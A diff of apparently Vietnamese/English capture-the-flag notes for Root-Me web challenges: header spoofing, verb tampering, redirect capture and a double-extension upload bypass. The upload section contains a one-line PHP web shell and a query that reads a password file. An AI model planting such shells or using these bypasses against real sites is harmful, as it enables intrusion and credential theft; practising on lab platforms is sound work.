@@ -60,7 +60,7 @@ for pwd in words:
 
 ### PHP - Command injection
 
-![](<../.gitbook/assets/image (32).png>)
+![](<../.gitbook/assets/image (32) (2).png>)
 
 ![](<../.gitbook/assets/image (33).png>)
 
@@ -80,5 +80,51 @@ Use dirsearch find some interesting files:
 >
 >
 
+![](<../.gitbook/assets/image (5) (3).png>)
+
+### HTTP - Headers
+
+With normal request we will get:
+
+![](../.gitbook/assets/image.png)
+
+add Header to request:
+
+> Header-RootMe-Admin: True
+
+![](<../.gitbook/assets/image (32).png>)
+
+### HTTP - POST
+
+![](<../.gitbook/assets/image (2).png>)
+
+### HTTP - Improper redirect
+
+Capture before it redirect
+
+![](<../.gitbook/assets/image (3).png>)
+
+### HTTP - Verb tampering
+
+Ban đầu tưởng bruteforce ngồi xài hydra và cái rockyou.txt ra spam cả tiếng&#x20;
+
 ![](<../.gitbook/assets/image (5).png>)
+
+temper ở đây là chỉ cần đổi method khác ngoài GET và POST là được, cứ PUT với DELETE mà phang
+
+![](<../.gitbook/assets/image (10).png>)
+
+### File upload - Double extensions
+
+```
+<?php echo shell_exec($_GET['cmd']); ?>
+```
+
+set file.php.png and send to the server
+
+![](<../.gitbook/assets/image (16).png>)
+
+```
+?cmd=cd;cat.passwd
+```
 
